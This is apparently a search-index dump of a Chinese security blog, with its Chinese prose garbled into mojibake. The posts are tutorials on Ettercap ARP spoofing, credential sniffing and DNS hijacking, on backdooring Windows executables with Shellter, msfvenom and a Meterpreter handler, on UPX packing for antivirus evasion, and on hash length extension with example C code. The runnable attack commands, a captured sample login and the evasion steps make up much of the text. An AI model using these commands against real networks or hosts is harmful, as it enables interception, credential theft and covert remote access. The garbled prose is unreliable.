å›¾ 2 æˆ–è€…ï¼Œæˆ‘ä»¬ç…§å¸¸è½¬å‘æµé‡ï¼ˆè¿™ä¸ªæ“ä½œç”± Ettercap è‡ªåŠ¨å®Œæˆï¼‰ï¼Œä½†æ˜¯å°†æ•°æ®åŒ…ä¸­çš„å›¾ç‰‡å­˜å‚¨ä¸‹æ¥ï¼š $ ettercap -i eth0 -Tq -M arp:remote /// /// $ driftnet -i eth0 -b -a -d pic å…¶ä¸­ -T è¡¨ç¤ºåªä½¿ç”¨å‘½ä»¤è¡Œï¼Œ-q è¡¨ç¤ºä¸æ˜¾ç¤ºå…·ä½“æ•°æ®åŒ…ä¿¡æ¯ï¼Œ-M æŒ‡å®šä½¿ç”¨çš„æ¨¡å¼ï¼Œ/// è¡¨ç¤ºåŒç½‘æ®µä¸‹æ‰€æœ‰ä¸»æœºï¼Œ-b è¡¨ç¤ºå£°éŸ³æé†’ï¼Œ-a ä¿å­˜å›¾ç‰‡ï¼Œ-d æŒ‡å®šä¿å­˜ç›®å½•ã€‚ ç”±äº Ettercap æˆªè·çš„æ˜¯æ•´ä¸ªæ•°æ®åŒ…ï¼Œå› æ­¤å¸¸å¸¸å¯ä»¥è·å–æ¯”å›¾ç‰‡æ›´æ•æ„Ÿçš„ä¿¡æ¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»å¼€å§‹ ARP æ¬ºéª—ï¼š $ ettercap -i eth0 -Tq -M arp:remote /// /// è¿™æ—¶ï¼ŒåŒç½‘æ®µä¸»æœºè®¿é—®äº†ä¸€ä¸ª http ç½‘ç«™å¹¶è¿›è¡Œç™»å½•ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤è¡Œçœ‹åˆ°ï¼š å›¾ 3 \" å›¾ 3 ç”±äºå¸å·å’Œå¯†ç æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“å¾—åˆ°å¸å· 10175101282 å’Œå¯†ç  aaaaaaã€‚ ","date":"2019-07-20","objectID":"/ettercap/:2:0","tags":["Kali","DNS","ç½‘ç»œ"],"title":"Ettercap ç®€æ˜“å…¥é—¨","uri":"/ettercap/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"DNS åŠ«æŒ ä½œä¸ºä¼ªç½‘å…³ï¼Œæˆ‘ä»¬å½“ç„¶ä¹Ÿå¯ä»¥å°†ä¸€äº›åŸŸåè§£æåˆ°æŒ‡å®šçš„ IPï¼Œå®ç° DNS åŠ«æŒã€‚é¦–å…ˆä¿®æ”¹å¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ /etc/ettercap/etter.dnsï¼Œåœ¨è¿™é‡Œé¢å¯ä»¥è¾“å…¥åŸŸååŒ¹é…è§„åˆ™ä¸è§£æè§„åˆ™ï¼Œå¦‚: *.edu.cn A 192.168.159.135 å¯ä»¥çœ‹å‡ºï¼Œå‰é¢æ˜¯ä¸€ä¸ªç±»æ­£åˆ™çš„åŸŸååŒ¹é…è§„åˆ™ï¼Œç„¶åä¸­é—´æŒ‡å®š A Recordï¼Œæœ€åæŒ‡å®šè¦è§£æåˆ°å“ªä¸ª IP åœ°å€ä¸Šï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†æ”»å‡»è€…ä¸»æœºå†…ç½‘ IPã€‚ ä¿å­˜åï¼Œæˆ‘ä»¬åœ¨æœ¬æœºå¼€ä¸€ä¸ªæœåŠ¡å™¨ï¼š $ service apache2 start ç„¶åå¼€å§‹ DNS åŠ«æŒï¼š $ ettercap -i eth0 -Tq -P dns_spoof /// /// å½“å—å®³è€…ä¸»æœºè®¿é—®ç±»ä¼¼ aaa.ecnu.edu.cn çš„åŸŸåæ—¶ï¼Œå°†ä¼šçœ‹åˆ°æˆ‘ä»¬çš„ Apache æœåŠ¡å™¨çš„é»˜è®¤é¡µé¢ï¼Œè¿™æ ·å°±å®Œæˆäº† DNS åŠ«æŒã€‚å‘½ä»¤è¡Œæç¤ºï¼š dns_spoof: A [aaa.ecnu.edu.cn] spoofed to [192.168.159.135] ç»“æœï¼š å›¾ 4 \" å›¾ 4 ","date":"2019-07-20","objectID":"/ettercap/:3:0","tags":["Kali","DNS","ç½‘ç»œ"],"title":"Ettercap ç®€æ˜“å…¥é—¨","uri":"/ettercap/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å°ç»“ æ˜¾ç„¶ä¸Šè¿°æ”»å‡»éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„å‰æï¼Œé‚£å°±æ˜¯æ”»å‡»è€…å’Œå—å®³è€…å¤„äºåŒä¸€ç½‘æ®µã€‚ç”±æ­¤ä¸éš¾å‘ç°ï¼Œå±€åŸŸç½‘å†…çš„å®‰å…¨æ˜¯ååˆ†è„†å¼±çš„ï¼Œè¿™æ˜¯ç”±å±€åŸŸç½‘å†…ä¸»æœºäº’ç›¸è®¿é—®çš„ä¾¿åˆ©æ€§æ‰€å¸¦æ¥çš„ä»£ä»·ï¼Œè€Œå¦‚ä½•é˜²æŠ¤è¿™ç±»æ”»å‡»æ˜¯éœ€è¦è¿›ä¸€æ­¥æ€è€ƒçš„é—®é¢˜ã€‚ ","date":"2019-07-20","objectID":"/ettercap/:4:0","tags":["Kali","DNS","ç½‘ç»œ"],"title":"Ettercap ç®€æ˜“å…¥é—¨","uri":"/ettercap/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è®°å½•ä¸€ä¸‹æœ€ç®€å•çš„æŒ‚åé—¨å’Œå…æ€æ–¹æ³•ï¼Œä¸æ€ä¹ˆæ¥è§¦è¿™å—ã€‚ ä¸»è¦ä»‹ç»ä¸¤ä¸ªå·¥å…·ï¼šShellter å’Œ Upxï¼Œåè€… Kali è‡ªå¸¦ã€‚Shellter çš„å®‰è£…ç•¥æœ‰ç‚¹å¤æ‚ï¼Œå› ä¸ºéœ€è¦ wine32 çš„æ”¯æŒã€‚ä½¿ç”¨çš„ Kali æ˜¯ 64 ä½çš„ã€‚ é¦–å…ˆ apt install shellter åº”è¯¥ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¯åŠ¨çš„æ—¶å€™ä¼šæç¤ºç¼ºå°‘ wine32ï¼Œå› æ­¤æ‰§è¡Œï¼š $ dpkg --add-architecture i386 \u0026\u0026 apt-get update \u0026\u0026 apt-get install wine32 è¿™ä¸€æ­¥ä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œå› ä¸º wine æœ¬èº«å¾ˆåºå¤§ã€‚è£…å®Œååº”è¯¥å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:0:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"é€šè¿‡ Shellter ç¯¡æ”¹ exe æ–‡ä»¶ éšæ„å–ä¸€ä¸ª exe æ–‡ä»¶ä½œä¸ºæˆ‘ä»¬è¦åŠ å…¥åé—¨çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é¦–å…ˆå¯åŠ¨ shellterï¼Œä¼šçœ‹åˆ°ï¼š å›¾ 1 \" å›¾ 1 è¾“å…¥ A é€‰æ‹©è‡ªåŠ¨æ¨¡å¼ï¼Œéšåè¾“å…¥ exe æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œç¨‹åºä¾¿ä¼šè‡ªåŠ¨è¿è¡Œï¼Œåˆ†æåŸæ–‡ä»¶å¹¶æ’å…¥æ¶æ„ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹å¤§çº¦æŒç»­ä¸åˆ°ä¸€åˆ†é’Ÿã€‚ è¾“å…¥ Y å¼€å¯éšè”½æ¨¡å¼ï¼Œéšåé€‰æ‹©ä½¿ç”¨å®ƒåˆ—å‡ºçš„ä¸ƒç§ payload è¿˜æ˜¯è‡ªå®šä¹‰ï¼Œè¿™é‡Œæˆ‘ä»¬è¾“å…¥ L é€‰æ‹©åˆ—å‡ºçš„ payloadã€‚ å¸¦ Meterpreter å‰ç¼€çš„æ˜¯æŒ‡å¯ä»¥é€šè¿‡ MSF è·å–ä¼šè¯çš„ payloadï¼Œæ–¹å¼æœ‰æ­£å‘ Bind ä¸åå‘ Reverse ä¸¤ç§ã€‚Bind é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ç”¨æˆ·æ‰“å¼€ exe åï¼Œå°†ä¼šåœ¨ç”¨æˆ·ä¸»æœºä¸Šå¼€æ”¾ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…å»è¿æ¥é‚£ä¸ªç«¯å£å°±å¯ä»¥è·å–ä¼šè¯ã€‚Reverse åˆ™æ˜¯åè¿‡æ¥ï¼Œä½¿ç”¨æˆ·ä¸»æœºè¿æ¥æ”»å‡»è€…å¼€æ”¾çš„ç«¯å£æ¥è·å–ä¼šè¯ã€‚è€Œå¸¦ Shell å‰ç¼€çš„ payload å¯ä»¥ç›´æ¥åå¼¹ shell ç»™æ”»å‡»è€…ã€‚ æ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡ä¸åŒçš„åè®®æ¥è·å–ä¼šè¯ï¼Œæ¯”å¦‚ä»»æ„ TCP åè®®ï¼ŒHTTP/HTTPS åè®®ç­‰ã€‚è¿™é‡Œä»¥é€‰æ‹© 4 å· payload Meterpreter_Bind_TCP ä¸ºä¾‹ã€‚ æœ€åè¦æ±‚è®¾ç½® LPORT ä¹Ÿå°±æ˜¯è¦åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰“å¼€çš„ç«¯å£ï¼Œåªè¦æ˜¯æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£éƒ½å¯ä»¥ï¼Œæ¯”å¦‚è¿™é‡Œå¯ä»¥è®¾ç½® 60000 ç«¯å£ã€‚ å®Œæˆä»¥åï¼Œæ–°çš„ exe æ–‡ä»¶å°±æ˜¯å·²ç»è¢«æ¤å…¥åé—¨çš„ exe æ–‡ä»¶ï¼Œç›¸æ¯”äºåŸæ–‡ä»¶ï¼Œå®ƒå ç©ºé—´å¤šäº†ä¸€ç‚¹ï¼Œå…¶å®ƒåœ°æ–¹ä¼¼ä¹çœ‹ä¸å‡ºä»€ä¹ˆåŒºåˆ«ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:1:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"é€šè¿‡ Meterpreter è·å–ä¼šè¯ å‡è®¾ç›®æ ‡ä¸»æœºï¼ˆWindowsï¼‰è·å¾—äº†æ–°çš„ exe æ–‡ä»¶ã€‚åœ¨åŒå‡»æ‰“å¼€å‰ï¼Œæˆ‘ä»¬æŸ¥çœ‹ç”¨ netstat -an æŸ¥çœ‹å…¶å·²ç»å¼€æ”¾çš„ç«¯å£ï¼š Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* ç„¶åæˆ‘ä»¬åŒå‡»æ‰“å¼€ï¼Œå‘ç°å’ŒåŸæ¥çš„ exe å®Œå…¨æ²¡æœ‰åŒºåˆ«ã€‚å†æ¬¡æŸ¥çœ‹ç«¯å£æƒ…å†µå¯ä»¥å‘ç°ï¼Œ60000 ç«¯å£æ‚„æ‚„å¼€å¯äº†ï¼š Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:60000 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹æ”»å‡»è€…è¦æ€ä¹ˆæ“ä½œæ¥è·å–ä¼šè¯ã€‚ é¦–å…ˆè¦ç¡®ä¿æ”»å‡»è€…å’Œç›®æ ‡ä¸»æœºåœ¨åŒä¸€ç½‘æ®µã€‚æ‰“å¼€ msfconsoleã€‚ä¾æ¬¡è¾“å…¥ï¼š use exploit/multi/handler set payload windows/meterpreter/bind_tcp set lport 60000 set rhost 192.168.159.128 exploit å…¶ä¸­ rhost éœ€è¦æ”¹ä¸ºç›®æ ‡ä¸»æœºçš„å†…ç½‘ IPã€‚ è¿™æ ·ä»¥åï¼Œå°±å¯ä»¥è·å–ä¼šè¯ï¼Œå¹¶æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼ˆä¼šè¯çš„ä½œç”¨ä¸å±€é™äºæ‰§è¡Œ shell å‘½ä»¤ï¼‰ï¼š å›¾ 2 \" å›¾ 2 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­ exe æ–‡ä»¶ï¼Œä¼šè¯ä¹Ÿå°†éšä¹‹å…³é—­ã€‚å› æ­¤å®é™…åœºæ™¯ä¸­å¸¸å¸¸é…åˆæŒä¹…åŒ–ææƒå·¥å…·ä½¿ç”¨ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:2:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä½¿ç”¨ msfvenom ç›´æ¥ç”Ÿæˆå¸¦åé—¨çš„ PE æ–‡ä»¶ ä¸Šé¢çš„ä¾‹å­éœ€è¦ä¿®æ”¹ä¸€ä¸ªå·²æœ‰çš„ exe æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”Ÿæˆè¿™æ ·çš„å¸¦åé—¨çš„æ–‡ä»¶ï¼š $ msfvenom -p windows/meterpreter/bind_tcp lport=60001 -f exe \u003e test.exe ç«¯å£å·ä¾ç„¶å¯ä»¥æ˜¯ä»»æ„æœªè¢«å ç”¨çš„ç«¯å£ã€‚msfvenom ä¹Ÿæä¾›äº†è®¸å¤šé€‰é¡¹å®ç°å…æ€ï¼Œè¿™é‡Œä¸ä¸€ä¸€ä»‹ç»äº†ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:3:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä½¿ç”¨ Upx ç»™ç¨‹åºåŠ å£³ è¿™æ ·åšçš„ä½œç”¨ä¸»è¦æœ‰ä¸¤ä¸ªï¼šå‹ç¼©æ–‡ä»¶å¤§å°å’Œå…æ€ã€‚ç„¶è€Œ Upx åŠ å£³æ¯•ç«Ÿæ˜¯æœ€æœ€ç®€å•çš„å…æ€æ–¹æ³•ï¼Œç°åœ¨çš„ç»å¤§å¤šæ•°æ€æ¯’è½¯ä»¶éƒ½èƒ½è½»æ˜“è„±å£³ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œç»™åˆšæ‰ç”Ÿæˆçš„ exe æ–‡ä»¶åŠ å£³ï¼Œåªéœ€è¦ï¼š $ upx -9 test.exe -1 å‚æ•°å‹ç¼©å¾—æœ€å¿«ï¼Œ-9 å‚æ•°å‹ç¼©è´¨é‡æœ€é«˜ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:4:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"åè®° è¿™ç¯‡æ–‡ç« å™è¿°çš„æ–¹æ³•æ˜¯æœ€åˆçº§çš„æ¤å…¥åé—¨çš„æ–¹æ³•ï¼Œç•¥è¿‡äº†å¾ˆå¤šæœ‰ä¸€å®šéš¾åº¦çš„ç»†èŠ‚ï¼Œè¯¦æƒ…å‚è§ Shellter/Upx/msfvenom çš„æ–‡æ¡£ã€‚ ","date":"2019-07-19","objectID":"/shellter-upx/:5:0","tags":["Kali"],"title":"ç®€å•çš„ PE åé—¨","uri":"/shellter-upx/"},{"categories":["Web å®‰å…¨"],"content":"ç®€å•ç¿»è¯‘äº† hash_extender çš„ README æ–‡æ¡£ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:0:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"èƒŒæ™¯ å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»æ˜¯å¯¹æ¶ˆæ¯è®¤è¯ç  MAC çš„æ”»å‡»ï¼Œæˆ‘ä»¬ä»¤å…¶ä¸­ä½¿ç”¨çš„å“ˆå¸Œå‡½æ•°ä¸º Hï¼Œåˆ™è¯¥æ”»å‡»é’ˆå¯¹çš„æ˜¯å½¢å¦‚ H(secret || data) è¿™ç±» MACï¼Œå…¶ä¸­ || æ˜¯è¿æ¥ç¬¦ã€‚å®¹æ˜“å—åˆ°æ”»å‡»çš„å“ˆå¸Œå‡½æ•°åŒ…æ‹¬ä½†ä¸é™äºï¼š MD4 MD5 RIPEMD-160 SHA-0 SHA-1 SHA-256 SHA-512 WHIRLPOOL ç„¶è€Œï¼ŒMD2/SHA-224/SHA-384 ä¸ä¼šå—åˆ°è¯¥æ”»å‡»ã€‚ æ”»å‡»è€…åœ¨ä¸çŸ¥é“ secret çš„æƒ…å†µä¸‹ï¼Œä»èƒ½äº§ç”Ÿåˆæ³•çš„ H(secret || data || attacker_controlled_data) çš„å€¼ã€‚è¿™æ˜¯ç”±äºä¸Šè¿°æ˜“å—æ”»å‡»çš„å“ˆå¸Œå‡½æ•°éƒ½æ‹¥æœ‰ç±»ä¼¼ â€œæ–­ç‚¹ç»­ä¼ â€ çš„èƒ½åŠ›ï¼šå³ä¸Šä¸€è½®å“ˆå¸Œå‡½æ•°çš„è¾“å‡ºæ‰€åŒ…å«çš„ä¿¡æ¯ï¼Œè¶³ä»¥ç”¨æ¥ç»§ç»­è¿›è¡Œä¸‹ä¸€è½®å“ˆå¸Œè®¡ç®—ã€‚æ”»å‡»è€…æ‰€åšçš„ï¼Œä¸è¿‡æ˜¯æ¥æ‰‹äº†ç»§ç»­è®¡ç®—å“ˆå¸Œçš„ä»»åŠ¡è€Œå·²ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œç»™å®šä¸€ä¸ª â€œä¸€ä¸ªæœªçŸ¥å‰ç¼€ + ä¸€ä¸ªå­—ç¬¦ä¸²â€ çš„å“ˆå¸Œå€¼ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å­—ç¬¦ä¸²ååŠ ä¸Šä»»æ„åç¼€ï¼Œç”Ÿæˆæ–°çš„å“ˆå¸Œå€¼è€Œä¸æ”¹å˜åŸæ¥çš„æœªçŸ¥å‰ç¼€ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:1:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"ä¾‹å­ secret = 'secret' data = 'data' H = md5() signature = H(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b append = 'append' æœåŠ¡å™¨å°† data å’Œ signature å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œæ”»å‡»è€…å¯ä»¥çŒœæµ‹ï¼ˆæˆ–é€šè¿‡å…¶ä»–æ–¹å¼ï¼‰ä½¿ç”¨çš„å“ˆå¸Œå‡½æ•°ä¸º MD5ï¼Œå› ä¸ºè¿”å›çš„å“ˆå¸Œå€¼é•¿ 32 ä½ï¼Œè€Œ MD5 æ˜¯æœ€å¸¸ç”¨çš„ 128-bit å“ˆå¸Œå‡½æ•°ã€‚ å·²çŸ¥ dataï¼Œsignatureï¼ŒH è¿™ä¸‰ä¸ªå‚æ•°ï¼Œæ”»å‡»è€…æƒ³è¦å°† append æ·»åŠ åˆ° data åé¢ï¼Œç„¶åç”Ÿæˆæ–°çš„åˆæ³•å“ˆå¸Œå€¼ï¼Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:2:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"å¡«å…… åœ¨è®¨è®ºå®é™…çš„æ”»å‡»å‰ï¼Œä¸å¾—ä¸å…ˆè¯´è¯´å“ˆå¸Œå‡½æ•°ä¸­çš„å¡«å……é—®é¢˜ã€‚ è®¡ç®— H(secret || data) æ—¶ï¼Œå­—ç¬¦ä¸² secret || data ä¼šè¢«å¡«å……ï¼Œå¡«å……ä½¿ç”¨çš„æ˜¯ä¸€ä½ 1 å’Œè‹¥å¹²ä½ 0ï¼Œç´§éšå…¶åçš„æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ª 0x80 å­—èŠ‚ï¼ŒåŠ ä¸Šè‹¥å¹²ä¸ª 0x00 å­—èŠ‚ï¼Œå†åŠ ä¸Šè¡¨ç¤ºé•¿åº¦çš„è‹¥å¹²å­—èŠ‚ã€‚åä¸¤è€…çš„å­—èŠ‚æ•°ï¼Œä»¥åŠé•¿åº¦å¦‚ä½•è¡¨ç¤ºï¼Œå–å†³äºå…·ä½“çš„å“ˆå¸Œå‡½æ•°å’Œåˆ†ç»„çš„å¤§å°ã€‚ å¯¹äºå¤§å¤šæ•°å“ˆå¸Œå‡½æ•°ï¼ˆåŒ…æ‹¬ MD4,MD5,RIPEMD-160,SHA-0,SHA-1 å’Œ SHA-256ï¼‰ï¼Œå­—ç¬¦ä¸²ä¼šè¢«å¡«å……è‡³é•¿åº¦ lenï¼Œä½¿å¾— len===56(mod 64) å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ¯”åˆ†ç»„å¤§å° 64 å­—èŠ‚å°‘ 8 å­—èŠ‚ã€‚å°‘æ‰çš„ 8 å­—èŠ‚ç”¨æ¥å­˜æ”¾é•¿åº¦ã€‚hash_extender ä¸­æœ‰ä¸¤ä¸ªä¾‹å¤–ï¼šSHA-512 åˆ†ç»„å¤§å°ä¸º 128 å­—èŠ‚ã€å¹¶ç”¨ 16 å­—èŠ‚è¡¨ç¤ºé•¿åº¦ï¼›WHIRLPOOL åˆ†ç»„å¤§å°ä¸º 64 å­—èŠ‚ã€å¹¶ç”¨ 32 å­—èŠ‚è¡¨ç¤ºé•¿åº¦ã€‚ æ­¤å¤–ï¼ŒMD4,MD5,RIPEMD-160 ä½¿ç”¨å°ç«¯æ³•è¡¨ç¤ºé•¿åº¦ï¼Œè€Œ SHA å®¶æ—å’Œ WHIRLPOOL ç”¨å¤§ç«¯æ³•ã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œlen(secret || data) = len('secretdata') = 10 å­—èŠ‚ï¼Œæˆ–è€…è¯´ 80(0x50) ä½ã€‚äºæ˜¯æˆ‘ä»¬æœ‰ï¼š10 å­—èŠ‚çš„æ•°æ® secretdataï¼Œ46 å­—èŠ‚å¡«å…… 0x80 0x00 0x00 ...ï¼Œä»¥åŠ 8 å­—èŠ‚å°ç«¯æ³•è¡¨ç¤ºçš„é•¿åº¦å­—æ®µ 50 00 00 00 00 00 00 00ï¼Œå…± 64 å­—èŠ‚ï¼š 0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:3:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"æ”»å‡» ç°åœ¨æˆ‘ä»¬æœ‰äº†è¦å“ˆå¸Œçš„æ•°æ®ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å®ç°æ”»å‡»ã€‚ é¦–å…ˆæˆ‘ä»¬æŠŠ append åŠ åˆ°åé¢ï¼Œå¾ˆç®€å•ï¼š 0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 0040 61 70 70 65 6e 64 append è¿™æ ·ä¸€å—æ•°æ®çš„å“ˆå¸Œå€¼æ˜¯æˆ‘ä»¬æœ€ç»ˆæƒ³è¦ï¼š è®¡ç®—å‡ºæ¥çš„ è®©æœåŠ¡å™¨è®¡ç®—çš„ è¦è®¡ç®—è¯¥å“ˆå¸Œå€¼ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š æ”¾è¿›ä¸€ä¸ª buffer é‡Œï¼Œç„¶åè°ƒç”¨ H(buffer) ä»ç¬¬ä¸€ä¸ªåˆ†ç»„çš„æœ«å°¾å¼€å§‹ï¼Œä½¿ç”¨æˆ‘ä»¬ä» signature ä¸­å·²çŸ¥çš„çŠ¶æ€ä¿¡æ¯ï¼Œç„¶åä»é‚£ä¸ªçŠ¶æ€å¼€å§‹å¯¹ append ä½œå“ˆå¸Œè¿ç®— ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æœåŠ¡å™¨å°†é‡‡ç”¨çš„ï¼Œè€Œç¬¬äºŒç§å°±æ˜¯æ”»å‡»è€…è¦é‡‡ç”¨çš„ã€‚æˆ‘ä»¬å…ˆçœ‹æœåŠ¡å™¨ç«¯ï¼Œå› ä¸ºæ›´ç®€å•ä¸€ç‚¹ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:4:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"æœåŠ¡å™¨ç«¯è®¡ç®— æˆ‘ä»¬çŸ¥é“æœåŠ¡å™¨ä¼šæŠŠ secret æ”¾åˆ°å­—ç¬¦ä¸²å‰é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠå»æ‰ secret åçš„æ¶ˆæ¯å‘è¿‡å»ï¼š 0000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............ 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append æ³¨æ„åˆ°è¿™é‡Œçš„æ•°æ®æ­£å¥½ 64 å­—èŠ‚â€”â€”ä¸è¦è¢«è¿·æƒ‘äº†ï¼Œè¿™åªæ˜¯å› ä¸º secret å’Œ append æ­£å¥½é•¿åº¦ç›¸åŒçš„å…³ç³»ã€‚æˆ–è®¸æˆ‘ä¸åº”è¯¥é€‰è¿™ä¸ªä¾‹å­ï¼Œä½†æˆ‘æ‡’å¾—é‡æ¥äº†ã€‚ã€‚ æœåŠ¡å™¨æŠŠ secret ä½œä¸ºå‰ç¼€ï¼š 0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 0040 61 70 70 65 6e 64 append ç„¶åè®¡ç®—å¾—åˆ°å“ˆå¸Œå€¼ï¼š 6ee582a1669ce442f3719c47430dadee ä½ å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç éªŒè¯ï¼š #include \u003cstdio.h\u003e#include \u003copenssl/md5.h\u003e int main(int argc, const char *argv[]) { MD5_CTX c; unsigned char buffer[MD5_DIGEST_LENGTH]; int i; MD5_Init(\u0026c); MD5_Update(\u0026c,\"secret\", 6); MD5_Update(\u0026c,\"data\" \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x00\" \"\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"append\", 64); MD5_Final(buffer, \u0026c); for (i = 0; i \u003c 16; 